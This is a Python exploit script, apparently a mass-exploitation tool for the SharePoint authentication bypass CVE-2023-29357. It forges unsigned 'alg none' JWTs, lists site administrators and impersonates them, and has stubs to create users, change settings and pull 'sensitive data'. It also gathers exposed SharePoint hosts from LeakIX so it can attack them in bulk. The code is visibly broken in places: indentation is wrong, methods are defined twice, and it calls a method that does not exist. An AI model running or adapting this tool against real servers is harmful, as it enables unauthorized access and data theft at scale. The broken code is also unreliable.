import json
import time
import base64
import requests
import argparse
from rich.console import Console
from urllib.parse import urlparse, urljoin
from typing import Union, List, Dict
from alive_progress import alive_bar
from leakpy.scraper import LeakixScraper
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

console = Console()
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class SharePoint:
    client_id = "00000003-0000-0ff1-ce00-000000000000"

    def __init__(self, url: str, verbose: bool, auth_type: str = "jwt"):
        self.url = url.rstrip('/')
        self.hostname = urlparse(url).hostname
        self.verbose = verbose
        self.auth_type = auth_type.lower()

        if self.verbose:
            console.print("[+] URL:", self.url, style="bold green")
            console.print("[+] Hostname:", self.hostname, style="bold green")
            console.print("[+] Authentication Type:", self.auth_type, style="bold green")

        self.realm = self.get_realm()
        self.aud = self.construct_aud_field()

    def get_realm(self) -> str:
        headers = {"Authorization": "Bearer "}
        response = requests.get(
            self.url + '/_api/web/siteusers', headers=headers, verify=False, timeout=3)

        if response.status_code != 401:
            console.print(
                "[-] Unable to retrieve realm", style="bold red") if self.verbose else None
            raise Exception("Unable to retrieve realm")

        www_authenticate_header = response.headers.get('WWW-Authenticate', '')
        if www_authenticate_header:
            realm = None
            for header in www_authenticate_header.split(','):
                if 'realm="' in header:
                    try:
                        realm = header.split('realm="')[1].split('"')[0]
                        break
                    except IndexError:
                        continue

        if self.verbose:
            console.print("[+] Realm:", realm, style="bold green")

        return realm


    def construct_aud_field(self) -> str:
    aud = ""

    # Check the authentication type and construct the "aud" field accordingly
    if self.auth_type == "jwt":
        aud = f"{self.client_id}@{self.realm}"
    elif self.auth_type == "oauth":
        # Specify how to construct "aud" in case of OAuth authentication
        aud = f"{self.client_id}@{self.realm}"
        # Additional processing may be needed here for OAuth authentication
    elif self.auth_type == "saml":
        # Specify how to construct "aud" in case of SAML authentication
        aud = f"{self.client_id}@{self.realm}"
        # Additional processing may be needed here for SAML authentication
    elif self.auth_type == "kerberos":
        # Specify how to construct "aud" in case of Kerberos authentication
        aud = f"{self.client_id}@{self.realm}"
        # Additional processing may be needed here for Kerberos authentication
    else:
        # Default value for JWT authentication if the authentication type is not specified
        aud = f"{self.client_id}@{self.realm}"

    # Print the constructed "aud" field if verbose mode is enabled
    if self.verbose:
        console.print("[+] Aud Field:", aud, style="bold green")

    return aud


    def authenticate_with_token(self, token: str) -> Union[bool, List[Dict[str, str]]]:
    # Define headers for the HTTP request
    headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "X-PROOF_TOKEN": token,
    }

    # Make a GET request to SharePoint API to authenticate with the provided token
    response = requests.get(self.url + '/_api/web/siteusers', headers=headers, verify=False, timeout=5)

    # Print a message indicating the attempt to authenticate if verbose mode is enabled
    if self.verbose:
        console.print("[!] Attempting authentication for", self.url, "with token", style="bold yellow")

    # Check the HTTP status code of the response
    if response.status_code == 200:
        try:
            # Parse the JSON response
            parsed_response = json.loads(response.text)
            users = parsed_response.get('value', [])
            
            # Filter out the admin users
            admin_users = [user for user in users if user.get('IsSiteAdmin', False) is True]
            admin_info_list = []

            # Extract relevant information about admin users
            for user in admin_users:
                admin_info = {
                    "Title": user.get('Title', 'N/A'),
                    "Email": user.get('Email', 'N/A'),
                    "NameId": user.get('UserId', {}).get('NameId', 'N/A'),
                    "NameIdIssuer": user.get('UserId', {}).get('NameIdIssuer', 'N/A')
                }
                admin_info_list.append(admin_info)

            # Print a success message if verbose mode is enabled
            if self.verbose and admin_users:
                for admin_info in admin_info_list:
                    console.print(json.dumps(admin_info, indent=2), style="bold green")
                    console.print("=+"*20, style="bold green")

            # Return the list of admin users or True if no admin users were found
            return admin_info_list if admin_info_list else True
        except json.JSONDecodeError:
            # Print a warning if verbose mode is enabled and JSON decoding fails
            if self.verbose:
                console.print(f"[+] Authenticated successfully for {self.url} but failed to parse the response text as JSON\nResponse Text: {response.text}", style="bold yellow")
            return True
    else:
        # Print an error message if verbose mode is enabled and authentication fails
        if self.verbose:
            console.print("[-] Authentication failed for", self.url, ". Status code:", response.status_code, style="bold red")
        return False


    def create_user_account(self, username: str, password: str) -> bool:
    # Define the payload for creating a new user account
    payload = {
        "UserName": username,
        "Password": password,
        # Add any additional parameters required for creating a user account
    }

    # Define the headers for the HTTP request
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {self.create_jwt_token()}",
        # Add any additional headers required for the request
    }

    # Define the endpoint URL for creating a new user account
    endpoint_url = self.url.strip() + '/_api/web/siteusers'

    # Make a POST request to SharePoint API to create a new user account
    response = requests.post(endpoint_url, json=payload, headers=headers, verify=False, timeout=5)

    # Print a message indicating the attempt to create a user account if verbose mode is enabled
    if self.verbose:
        console.print("[!] Attempting to create a user account for", username, "at", endpoint_url, style="bold yellow")

    # Check the HTTP status code of the response
    if response.status_code == 201:
        # Print a success message if verbose mode is enabled
        if self.verbose:
            console.print(f"[+] User account created successfully for {username} at {endpoint_url}", style="bold green")
        return True
    else:
        # Print an error message if verbose mode is enabled and user account creation fails
        if self.verbose:
            console.print(f"[-] Failed to create a user account for {username} at {endpoint_url}. Status code: {response.status_code}", style="bold red")
        return False

    def modify_settings(self, settings: Dict[str, str]) -> bool:
    # Define the payload for modifying settings
    payload = {
        "settings": settings,
        # Add any additional parameters required for modifying settings
    }

    # Define the headers for the HTTP request
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {self.create_jwt_token()}",
        # Add any additional headers required for the request
    }

    # Define the endpoint URL for modifying settings
    endpoint_url = self.url.strip() + '/_api/web/settings'

    # Make a PATCH request to SharePoint API to modify settings
    response = requests.patch(endpoint_url, json=payload, headers=headers, verify=False, timeout=5)

    # Print a message indicating the attempt to modify settings if verbose mode is enabled
    if self.verbose:
        console.print("[!] Attempting to modify settings at", endpoint_url, style="bold yellow")

    # Check the HTTP status code of the response
    if response.status_code == 200:
        # Print a success message if verbose mode is enabled
        if self.verbose:
            console.print(f"[+] Settings modified successfully at {endpoint_url}", style="bold green")
        return True
    else:
        # Print an error message if verbose mode is enabled and modifying settings fails
        if self.verbose:
            console.print(f"[-] Failed to modify settings at {endpoint_url}. Status code: {response.status_code}", style="bold red")
        return False

    def access_sensitive_data(self) -> Union[bool, Dict[str, str]]:
    # Define the headers for the HTTP request
    headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {self.create_jwt_token()}",
        # Add any additional headers required for the request
    }

    # Define the endpoint URL for accessing sensitive data
    endpoint_url = self.url.strip() + '/_api/web/sensitive_data'

    # Make a GET request to SharePoint API to access sensitive data
    response = requests.get(endpoint_url, headers=headers, verify=False, timeout=5)

    # Print a message indicating the attempt to access sensitive data if verbose mode is enabled
    if self.verbose:
        console.print("[!] Attempting to access sensitive data at", endpoint_url, style="bold yellow")

    # Check the HTTP status code of the response
    if response.status_code == 200:
        try:
            # Parse the JSON response
            parsed_response = json.loads(response.text)
            
            # Print the sensitive data if verbose mode is enabled
            if self.verbose:
                console.print(f"[+] Sensitive data accessed successfully at {endpoint_url}", style="bold green")
                console.print(json.dumps(parsed_response, indent=4), style="bold green")
            
            # Return the sensitive data
            return parsed_response
        except json.JSONDecodeError:
            # Print a warning if verbose mode is enabled and JSON decoding fails
            if self.verbose:
                console.print(f"[+] Sensitive data accessed successfully at {endpoint_url} but failed to parse the response text as JSON\nResponse Text: {response.text}", style="bold yellow")
            return True
    else:
        # Print an error message if verbose mode is enabled and accessing sensitive data fails
        if self.verbose:
            console.print(f"[-] Failed to access sensitive data at {endpoint_url}. Status code: {response.status_code}", style="bold red")
        return False



    def construct_aud_field(self) -> str:
        aud = f"{self.client_id}@{self.realm}"

        if self.verbose:
            console.print("[+] Aud Field:", aud, style="bold green")

        return aud

    def spoof_admin_users(self, admin_users: List[Dict[str, str]]) -> None:
        current_time = int(time.time())
        expiration_time = current_time + 3600

        for user in admin_users:
            payload = {
                "aud": self.aud,
                "iss": self.client_id,
                "nbf": current_time,
                "exp": expiration_time,
                "ver": "hashedprooftoken",
                "nameid": user.get("NameId", ""),
                "nii": user.get("NameIdIssuer", ""),
                "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
                "endpointurlLength": 1,
                "isloopback": True,
                "isuser": True
            }

            header = {"alg": "none"}
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()).rstrip(b'=')
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()).rstrip(b'=')

            jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"

            headers = {
                "Accept": "application/json",
                "Authorization": f"Bearer {jwt_token}",
                "X-PROOF_TOKEN": jwt_token,
            }

            endpoint_url = urljoin(self.url, '/_api/web/currentuser')
            response = requests.get(
                endpoint_url, headers=headers, verify=False, timeout=5)
            if response.status_code == 200:
                try:
                    parsed_response = json.loads(response.text)
                    console.print(
                        f"[+] Spoofing succeeded for {user.get('Title', 'Unknown User')}: {user.get('Email', 'N/A')} at '/_api/web/currentuser'", style="bold green")
                    console.print(
                        json.dumps(parsed_response, indent=4), style="bold green")
                except json.JSONDecodeError:
                    console.print(
                        f"[+] Spoofing succeeded for {user.get('Title', 'Unknown User')}: {user.get('Email', 'N/A')} at '/_api/web/currentuser'", style="bold green")
                    console.print(
                        f"Received non-JSON response:\n{response.text}", style="bold yellow")
            else:
                console.print(
                    f"[-] Spoofing failed for {user.get('Title', 'Unknown User')}: {user.get('Email', 'N/A')} at '/_api/web/currentuser'. Status code: {response.status_code}", style="bold red")

    def create_jwt_token(self) -> str:
        header = {"alg": "none"}
        current_time = int(time.time())
        expiration_time = current_time + 3600

        payload = {
            "aud": self.aud,
            "iss": self.client_id,
            "nbf": int(current_time),
            "exp": int(expiration_time),
            "ver": "hashedprooftoken",
            "nameid": f'{self.client_id}@{self.realm}',
            "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
            "endpointurlLength": 1,
            "isloopback": True
        }

        encoded_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()).rstrip(b'=')
        encoded_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()).rstrip(b'=')

        jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"

        if self.verbose:
            console.print("[+] JWT Token:", jwt_token, style="bold green")

        return jwt_token

    def authenticate_with_token(self, token: str) -> Union[bool, List[Dict[str, str]]]:
        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "X-PROOF_TOKEN": token,
        }

        response = requests.get(
            self.url + '/_api/web/siteusers', headers=headers, verify=False, timeout=5)

        if self.verbose:
            console.print(
                "[!] Attempting authentication for", self.url, "with token", style="bold yellow")

        if response.status_code == 200:
            try:
                parsed_response = json.loads(response.text)
                users = parsed_response.get('value', [])
                admin_users = [user for user in users if user.get(
                    'IsSiteAdmin', False) is True]
                admin_info_list = []

                for user in admin_users:
                    admin_info = {
                        "Title": user.get('Title', 'N/A'),
                        "Email": user.get('Email', 'N/A'),
                        "NameId": user.get('UserId', {}).get('NameId', 'N/A'),
                        "NameIdIssuer": user.get('UserId', {}).get('NameIdIssuer', 'N/A')
                    }
                    admin_info_list.append(admin_info)

                console.print(
                    f"[+] Authenticated successfully for {self.url}\n", style="bold green")
                if self.verbose and admin_users:
                    for admin_info in admin_info_list:
                        console.print(
                            json.dumps(admin_info, indent=2), style="bold green")
                        console.print("=+"*20, style="bold green")

                return admin_info_list if admin_info_list else True

            except json.JSONDecodeError:
                if self.verbose:
                    console.print(
                        f"[+] Authenticated successfully for {self.url} but failed to parse the response text as JSON\nResponse Text: {response.text}", style="bold yellow")
                return True

        else:
            if self.verbose:
                console.print(
                    "[-] Authentication failed for", self.url, ". Status code:", response.status_code, style="bold red")
            return False

def save_exploitation_results(self, results: List[str], output_file: str) -> None:
        with open(output_file, 'a') as file:
            for result in results:
                file.write(result + '\n')


def check_url(url: str, output_file: str = None, verbose: bool = False, auth_type: str = "jwt", exploit_type: str = "default", mass_exploit: bool = False):
    try:
        # Validate the input
        if not url.startswith('http://') and not url.startswith('https://'):
            raise Exception('Invalid URL')

        sp = SharePoint(url, verbose=verbose, auth_type=auth_type)
        token = sp.create_token()
        authenticated = sp.authenticate_with_token(token)

        exploitation_results = []

        if authenticated:
            if exploit_type == "create_user":
                success = sp.create_user_account("new_user", "new_password")
                exploitation_results.append(
                    f"Create User: {success}, Username: new_user, Password: new_password")
            elif exploit_type == "modify_settings":
                success = sp.modify_settings({"setting_name": "new_value"})
                exploitation_results.append(
                    f"Modify Settings: {success}, Setting: setting_name, New Value: new_value")
            elif exploit_type == "access_sensitive_data":
                data = sp.access_sensitive_data()
                if data:
                    exploitation_results.append(
                        f"Access Sensitive Data: {json.dumps(data)}")

            if output_file:
                sp.save_exploitation_results(
                    exploitation_results, output_file)

            if not mass_exploit and isinstance(authenticated, list):
                sp.spoof_admin_users(authenticated)

    except Exception as e:
        if verbose:
            console.print("[!] Error in check_url:", str(e), style="bold red")


def fetch_from_leakix(fields="protocol, host, port, document", bulk=False, pages=2):
    LEAKIX_API_KEY = ""  # Configure this line with your Leakix Pro API Key to use LeakPy

    if LEAKIX_API_KEY == "":
        console.print("[bold red]Please configure the Leakix API key.[/bold red]")
        exit(1)

    scraper = LeakixScraper(api_key=LEAKIX_API_KEY, verbose=True)

    results = scraper.execute(
        scope="leak",
        query='+plugin:SharePointPlugin',
        fields=fields,
        pages=pages,
        use_bulk=bulk,
    )

    url_dict = {}
    for result in results:
        protocol = result.get("protocol")
        host = result.get("host")
        port = result.get("port")
        document = result.get("document")
        url = f"{protocol}://{host}:{port}"
        if document:
            url += f"/{document}"
        url_dict[url] = None

    return list(url_dict.keys())


def main():
    parser = argparse.ArgumentParser(
        description='Mass tester for SharePoint CVE-2023–29357 Authentication Bypass.')
    parser.add_argument('-u', '--url', type=str,
                        help='The base url for the requests', required=False)
    parser.add_argument('-l', '--list', type=str,
                        help='File containing a list of base urls to scan', required=False)
    parser.add_argument('-t', '--threads', type=int,
                        help='Number of threads to use', default=10)
    parser.add_argument('-o', '--output', type=str,
                        help='File to output vulnerable urls', default='output.txt')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Print verbose output', default=False)
    parser.add_argument('--leakpy', action='store_true',
                        help="Use Leakix to fetch URLs based on leaks")
    parser.add_argument('--bulk', action='store_true',
                        help="Use bulk_mode on LeakIX (Pro API Key only)")
    parser.add_argument('--pages', type=int, default=2,
                        help="Page results on LeakIX")

    args = parser.parse_args()

    urls = []
    if args.leakpy:
        urls = fetch_from_leakix(bulk=args.bulk, pages=args.pages)
    elif args.list:
        with open(args.list, 'r') as file:
            urls = [line.strip() for line in file.readlines()]
    elif args.url:
        urls = [args.url]

    if urls:
        if (len(urls) > 1 and (args.leakpy or args.list)):
            with ThreadPoolExecutor(max_workers=args.threads) as executor, alive_bar(len(urls), bar='smooth', enrich_print=False) as bar:
                futures = {executor.submit(check_url, url, args.output, args.verbose, mass_exploit=True): url for url in urls}
                for future in as_completed(futures):
                    bar()
        else:
            check_url(urls[0], args.output, args.verbose, mass_exploit=False)
    else:
        console.print("[red]Please provide a url or a file with a list of base urls to scan.[/red]")


if __name__ == "__main__":
    main()
